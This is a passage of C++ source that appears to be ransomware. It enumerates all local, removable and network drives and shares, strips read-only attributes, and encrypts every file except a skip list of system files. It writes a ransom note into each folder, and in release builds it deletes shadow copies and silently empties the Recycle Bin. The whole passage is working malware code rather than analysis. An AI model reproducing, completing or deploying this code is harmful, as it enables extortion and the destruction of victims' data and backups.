	LOCKED_NOTE, L"ntldr", L"pagefile.sys", L"ntdetect.com", L"autoexec.bat", 
	L"desktop.ini", L"autorun.inf", L"ntuser.dat", L"iconcache.db", L"bootsect.bak", 
	L"boot.ini", L"bootfont.bin", L"config.sys", L"io.sys", L"msdos.sys", L"ntuser.dat.log", 
	L"thumbs.db", L"swapfile.sys" };


void SearchFolder(std::wstring path) 
{
	WIN32_FIND_DATAW fd;
	HANDLE hFind = FindFirstFileW(std::wstring(path + L"\\*").c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {

			if (g_stopsearch) {
				dbg(LEVEL0, "Info: search proc stopping...");
				break;
			}

			//
			std::wstring newPath = std::wstring(path + L"\\" + fd.cFileName);

			if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY) 
			{
				// skip current and parent folder
				if (lstrcmpW(L"..", fd.cFileName) == 0 || lstrcmpW(L".", fd.cFileName) == 0)
					continue;

				for (auto& blackFolder : blackFolders) {
					if (StrStrW(CharLowerW(fd.cFileName), blackFolder)) {
						dbg(LEVEL1, "Warning: Folder in black list %S", newPath.c_str());
						goto _skip_current_file;
					}
				}

				// handle directory
				SearchFolder(newPath);
			}
			else 
			{
				// handle file
				dbg(LEVEL1, "Checking for encryption %S", newPath.c_str());

				InterlockedIncrement(&filesParsedBySearch);

				for (auto& blackFile : blackFiles) {
					if (StrStrW(CharLowerW(fd.cFileName), blackFile)) {
						dbg(LEVEL1, "File in untouchable list %S, %S", fd.cFileName, blackFile);
						goto _skip_current_file;
					}
				}

				while (filesOpened > _FILES_OPENED_MAX_COUNT_) {
					Sleep(1);
				}

				if ((fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY) == FILE_ATTRIBUTE_READONLY) {
					dbg(LEVEL1, "Change file attributes");
					if (!SetFileAttributesW(newPath.c_str(), fd.dwFileAttributes & ~FILE_ATTRIBUTE_READONLY)) {
						dbg(LEVEL1, "Failed to change attributes %S, err=%d", newPath.c_str(), GetLastError());
					}
				}

				EncryptFileIOCP(newPath);
			}

_skip_current_file:;

		} while (FindNextFileW(hFind, &fd) != FALSE);

		FindClose(hFind);

		makeNote((path + L"\\" + std::wstring(LOCKED_NOTE)).c_str());
	}
	else {
		dbg(LEVEL1, "Failed to looking up folder %S, error=%u", path.c_str(), GetLastError());
	}
}


DWORD WINAPI CalculateSpeedsThread(LPVOID) {

	WCHAR buffer[1024];

	while (g_globalStop == false)
	{
		Sleep(1000);

		wsprintfW(buffer, L"read=%u kbytes, write=%u kbytes, opened=%u, encPS=%u, totalFound=%u, TotalEncrypted=%u", readSpeed / 1024, writeSpeed / 1024, filesOpened, encryptedPerSecond, filesParsedBySearch, totalEncrypted);
		SetConsoleTitleW(buffer);

		InterlockedExchange(&readSpeed, 0);
		InterlockedExchange(&writeSpeed, 0);
		InterlockedExchange(&encryptedPerSecond, 0);
	}

	dbg(LEVEL0, "Global stop flagged, CalcSpeedThread() job done");

	return 0;
}


bool isCpuAesSupports() {
	int regs[4];
	__cpuid(regs, 1);
	return ( ((regs[2] >> 25) & 1) == 1);
}


DWORD WINAPI DriveSearchThread(LPVOID dw) {
	std::wstring* searchPath = (std::wstring*)dw;

	dbg(LEVEL0, "Thread(%u): Looking for files in drive %S", GetCurrentThreadId(), searchPath->c_str());
	SearchFolder(std::wstring(*searchPath));

	dbg(LEVEL0, "Thread(%u): Search thread job done", GetCurrentThreadId());

	delete searchPath;

	return 0;
}



#ifdef _LOG_ENABLED_
BOOL WINAPI CtrlHandler(DWORD fdwCtrlType)
{
	g_stopsearch = true;
	return TRUE;
}
#endif


void SearchDrives(std::vector<HANDLE>& searchThreads) {
	WCHAR wDriveName[4] = { L' ', L':', L'\\', 0 };
	DWORD dwDrives = GetLogicalDrives();
	for (int i = 0; i < 32; i++) {
		if ((dwDrives & 1) == 1) {
			wDriveName[0] = L'A' + i;
			DWORD driveType = GetDriveTypeW(wDriveName);
			if (driveType == DRIVE_REMOTE || driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
				if (searchThreads.size() < MAXIMUM_WAIT_OBJECTS) {
					auto ptrPath = new std::wstring(wDriveName);
					searchThreads.emplace_back(CreateThread(nullptr, 0, DriveSearchThread, (LPVOID)ptrPath, 0, nullptr));
				}

			}
		};
		dwDrives >>= 1;
	}
}


void SearchNetFolders(std::vector<HANDLE> & searchThreads, _In_ LPNETRESOURCEW pNetResource) {

	HANDLE hEnum;
	DWORD dwEntries = -1, cbBuffer = 0x4000;
	if (WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, RESOURCEUSAGE_ALL, pNetResource, &hEnum) == NO_ERROR)
	{
		if (pNetResource = (LPNETRESOURCEW)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBuffer))
		{
			while (WNetEnumResourceW(hEnum, &dwEntries, pNetResource, &cbBuffer) == NO_ERROR)
			{
				for (DWORD i = 0; i < dwEntries; ++i)
				{
					if ((pNetResource[i].dwUsage & RESOURCEUSAGE_CONTAINER) == RESOURCEUSAGE_CONTAINER) {
						SearchNetFolders(searchThreads , &pNetResource[i]);
					}
					else {
						if (searchThreads.size() < MAXIMUM_WAIT_OBJECTS) {
							auto ptrPath = new std::wstring(pNetResource[i].lpRemoteName);
							HANDLE hThread = CreateThread(nullptr, 0, DriveSearchThread, (LPVOID)ptrPath, CREATE_SUSPENDED, nullptr);
							DowngradeThreadTokenForThreadHandle(&hThread);
							ResumeThread(hThread);
							searchThreads.emplace_back(hThread);
						}
					}
				}
			}
			HeapFree(GetProcessHeap(), 0, pNetResource);
		}
		WNetCloseEnum(hEnum);
	}

}



void DoIOCP(LPWSTR *lpwParams, int numArgs)
{

#ifdef _LOG_ENABLED_
	SetConsoleCtrlHandler(CtrlHandler, TRUE);
#endif

	if (!default_parameters.bFullFileEncrypt && !default_parameters.limitFileSizeEncrypt) {
		dbg(LEVEL0, "Bad params");
		default_parameters.bEncryptFileBlocks = true;
	}

	if (isCpuAesSupports()) {
		dbg(LEVEL0, "CPU AES +");
		// aes128_self_test();
	}

	SYSTEM_INFO sinfo;
	GetSystemInfo(&sinfo);

	size_t numberOfThreads = sinfo.dwNumberOfProcessors * 2;

	// numberOfThreads = 1;

	dbg(LEVEL0, "Number of threads %u", numberOfThreads);
	h_Port = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, numberOfThreads);
	if (h_Port == 0) {
		dbg(LEVEL0, "ERROR: Failed to create io port %u, quit.", GetLastError());
		return;
	}

	std::vector<HANDLE> readWriteThreads;
	for (size_t i = 0; i < numberOfThreads; i++) {
		readWriteThreads.emplace_back(CreateThread(0, 0, ReadWritePoolThread, 0, 0, 0));
	}

#ifdef _LOG_ENABLED_
	HANDLE hCalculateSpeedThread = CreateThread(nullptr, 0, CalculateSpeedsThread, 0, 0, nullptr);
#endif

	// path from command line
	if (numArgs >= 3) 
	{
		if (lstrcmpiW(lpwParams[1], L"-path") == 0) 
		{
			dbg(LEVEL0, "Looking for folder from cmd: %S", lpwParams[2]);
			SearchFolder( lpwParams[2] );

			dbg(LEVEL0, "Search folder %S complete", lpwParams[2]);
		}
	}
	else if (numArgs == 1)
	{
#ifndef _DEBUG
		//
		removeShadows();

		//
		SHEmptyRecycleBinA(nullptr, nullptr, SHERB_NOCONFIRMATION);

		//
		// TerminateActiveProcessList();
#endif
		//
		std::vector<HANDLE> searchThreads;

		//
		SearchDrives(searchThreads);

		//
		DowngradeThreadTokenForThreadHandle(nullptr);
		SearchNetFolders(searchThreads, nullptr);

		//
		dbg(LEVEL0, "Info: Waiting search threads job done");
		WaitForMultipleObjects(searchThreads.size(), searchThreads.data(), TRUE, INFINITE);

		//
		dbg(LEVEL0, "Info: All search threads jobs done");
		for (DWORD i = 0; i < searchThreads.size(); i++)
			CloseHandle(searchThreads[i]);
	}

	dbg(LEVEL0, "Waiting for all handles will be processed...");

	while (g_globalStop == false)
	{
		if (filesOpened == 0) {
			dbg(LEVEL0, "Nothing to process... quit loop");
			g_globalStop = true;
		}

		Sleep(1000);
	}

	dbg(LEVEL0, "Waiting for working threads done");
	WaitForMultipleObjects(readWriteThreads.size(), readWriteThreads.data(), TRUE, INFINITE);

#ifdef _LOG_ENABLED_
	WaitForSingleObject(hCalculateSpeedThread, INFINITE);
#endif

	dbg(LEVEL0, "Threads was terminated ?");
	for (size_t i = 0; i < readWriteThreads.size(); i++) {
		CloseHandle(readWriteThreads[i]);
	}

#ifdef _LOG_ENABLED_
	CloseHandle(hCalculateSpeedThread);
#endif
}